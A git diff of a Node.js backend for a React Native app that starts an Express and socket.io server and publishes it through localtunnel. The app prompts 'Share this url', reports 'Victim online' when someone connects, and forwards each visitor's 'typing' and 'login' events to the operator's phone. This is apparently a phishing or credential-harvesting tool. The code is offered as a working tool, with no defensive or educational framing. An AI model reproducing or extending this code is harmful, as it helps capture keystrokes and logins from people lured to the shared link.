@@ -1,54 +1,54 @@
 var rn_bridge = require('rn-bridge');
-const test=()=>{
 const localtunnel = require('localtunnel');
-const express = require('express')
+const express = require('express');
 const app = express()
 const http = require('http').createServer(app)
+const io = require('socket.io')(http)
+var tunnel;
+const startServer=()=>{
 const port = 8080;
 /*starting server and tunneling */
+rn_bridge.channel.send("Generating link please wait..");
+setTimeout(()=>{},3000);
 http.listen(port, (err) => {
-    if (err) return console.log(`Something bad happened: ${err}`);
-    console.log(`Node.js server listening on ${port}`);
+    if (err) return;
    (async () => {
-   const tunnel = await localtunnel({ port: 8080,subdomain:"anirudh" });
-   rn_bridge.channel.send("URL:\n" +tunnel.url);
+    tunnel = await localtunnel({ port: 8080,subdomain:"anirudh" });
+    rn_bridge.channel.send("URL"+tunnel.url);
+    rn_bridge.channel.send("Share this url");
     })();
 });
 app.use(express.static(__dirname + '/public'))
 app.get('/', (req, res) => {
     res.sendFile(__dirname + '/index.html')
 })
-// Socket 
-const io = require('socket.io')(http)
+/*starting socket */
 io.on('connection', (socket) => {
-    rn_bridge.channel.send("londa connected");
+    rn_bridge.channel.send("Victim online");
     socket.on('typing', (data) => {
       //socket.broadcast.emit('message', msg)
-      rn_bridge.channel.send(JSON.stringify(data));
+      rn_bridge.channel.send(data);
       })
     socket.on('login', (data) => {
         //socket.broadcast.emit('message', msg)
-        rn_bridge.channel.send(JSON.stringify(data));
-      });
+        rn_bridge.channel.send(data);
+      });})
 
+}//startserver function close 
 
-
-})
+const stopServer =()=>{
+  http.close();
+  rn_bridge.channel.send("Server stopped")
 }
-
-
 
 rn_bridge.channel.on('message', (msg) => {
   try {
     switch(msg) {
-      case 'versions':
-        rn_bridge.channel.send(
-          "Versions: " +
-          JSON.stringify(process.versions)
-        );
+      case 'start':
+        startServer()
         break;
-      case 'run':
-        test()
+        case 'stop':
+        stopServer()
         break;
       default:
         rn_bridge.channel.send(
@@ -62,6 +62,3 @@ rn_bridge.channel.on('message', (msg) => {
     rn_bridge.channel.send("Error: " + JSON.stringify(err) + " => " + err.stack );
   }
 });
-
-// Inform react-native node is initialized.
-rn_bridge.channel.send("Node was initialized. Versions: " + JSON.stringify(process.versions));
